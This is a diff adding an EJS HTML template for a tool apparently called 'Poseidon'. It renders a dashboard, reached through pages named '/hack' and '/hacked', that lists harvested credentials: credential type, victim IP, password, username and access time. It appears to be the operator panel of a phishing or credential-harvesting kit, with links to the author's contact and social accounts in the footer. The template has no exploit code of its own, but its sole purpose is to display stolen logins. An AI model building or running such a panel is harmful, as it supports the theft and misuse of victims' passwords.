@@ -1,0 +1,133 @@
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" type="image/x-icon" style="border-radius: 50%;" href="/images/poseidon.png">
+    <title>Poseidon</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/charts.css/dist/charts.min.css">
+    <link rel="stylesheet" href="/css/index.css">
+   <link rel="stylesheet" href="/css/repo.css">
+    <script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.2.1.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/typed.js/1.1.1/typed.min.js"></script>
+
+    <style type="text/css">
+        @font-face {
+            font-family: Roboto;
+            src: url("chrome-extension://mcgbeeipkmelnpldkobichboakdfaeon/css/Roboto-Regular.ttf");
+        }
+    </style>
+</head>
+
+<body>
+    <!-- partial:index.partial.html -->
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css">
+
+    <div id="app">
+        <div class="app-container flex-container">
+            <div id="app-nav">
+                <div class="flex-center"><img id="logo" src="/images/poseidon.png"></div>
+                <div>
+                    <a href="/">
+                        <div class="nav-item flex-center "><i class="fa fa fa-home"></i></div>
+                    </a>
+                    <a href="/hack">
+                        <div class="nav-item flex-center "><i class="fa fa-bug"></i></div>
+                    </a>
+                    <a href="/hacked">
+                        <div class="nav-item flex-center active"><i class="fas fa-coins"></i></div>
+                    </a>
+
+                </div>
+            </div>
+            <div class="flex-column" id="app-dashboard">
+                <div class="flex-row flex-apart" id="dashboard-header">
+                    <div>
+                        <h1>Welcome <%= uname %>
+                        </h1>
+                        <h2>
+                            <%= date %>
+                        </h2>
+                    </div>
+                    <div>
+                        <div class="flex-row flex-apart"><i class="fa fa-user header-icon"></i></div>
+                    </div>
+                </div>
+                <div class="flex-apart flex-column" id="dashboard-charts">
+                    <section>
+                        <div class="tbl-header">
+                            <table cellpadding="0" cellspacing="0" border="0">
+                                <thead>
+                                    <tr>
+                                        <th>Credentials Type</th>
+                                        <th>Ip Address</th>
+                                        <th>Password</th>
+                                        <th>Username</th>
+                                        <th>Accessed Time</th>
+                                    </tr>
+                                </thead>
+                            </table>
+                        </div>
+                        <div class="tbl-content">
+                            <table cellpadding="0" cellspacing="0" border="0">
+                                <tbody>
+                                    <% cred.forEach((item)=> {
+                                        let credtype = (item.credtype);
+                                        let username = (item.username);
+                                        let password = (item.password);
+                                        let ip = (item.ip);
+                                        let time = new Date(item.time).toLocaleString().replace(',','');
+                                        %>
+                                    <tr>
+                                        <td><%= credtype %></td>
+                                        <td id=rep><%= ip %></td>
+                                        <td><%= password %></td>
+                                        <td><%= username %></td>
+                                        <td><%= time %></td>
+                                    </tr>
+                                   
+                                <% }) %>
+                                    <client></client>
+                                </tbody>
+                            </table>
+                        </div>
+                    </section>
+                    
+                    <div class="fotter">
+                        <p class="middle">
+                    
+                            <a class="btn" href="tel:+918270913635">
+                                <i class="fa fa-phone" style="transform: rotate(90deg);"></i>
+                            </a>
+                            <a class="btn" href="mailto:contact@karthithehacker.com">
+                                <i class="fa fa-envelope"></i>
+                            </a>
+                            <a class="btn" href="https://karthithehacker.com/">
+                                <i class="fab fa-google"></i>
+                            </a>
+                            <a class="btn" href="https://instagram.com/karthithehacker">
+                                <i class="fab fa-instagram"></i>
+                            </a>
+                    
+                            <a class="btn" href="https://www.youtube.com/karthithehacker">
+                                <i class="fab fa-youtube"></i>
+                            </a>
+                    
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+    <!-- partial -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/react/17.0.2/umd/react.production.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/17.0.2/umd/react-dom.production.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/classnames/2.3.1/index.min.js"></script>
+    <script src="/js/index.js"></script>
+
+
+
+
+</body>
+
+</html>
